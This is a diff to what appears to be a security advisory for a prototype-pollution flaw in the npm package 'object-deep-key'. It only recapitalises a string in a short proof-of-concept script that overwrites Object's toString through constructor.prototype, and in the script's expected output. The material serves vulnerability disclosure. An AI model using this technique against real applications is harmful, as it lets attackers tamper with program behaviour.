@@ -10,7 +10,7 @@
 const objDeepKey = require('object-deep-key').default
 
 console.log(`Before: ${{}.toString}`)
-objDeepKey(constructor.prototype, 'toString').set('Function prototype polluted')
+objDeepKey(constructor.prototype, 'toString').set('function prototype polluted')
 console.log(`After: ${{}.toString}`)
 ```
 2. Execute the following commands in the terminal:
@@ -21,7 +21,7 @@ node poc.js # run the PoC
 3. Check the output:
 ```
 Before: function toString() { [native code] }
-After: Function prototype polluted
+After: function prototype polluted
 ```
 
 # Impact
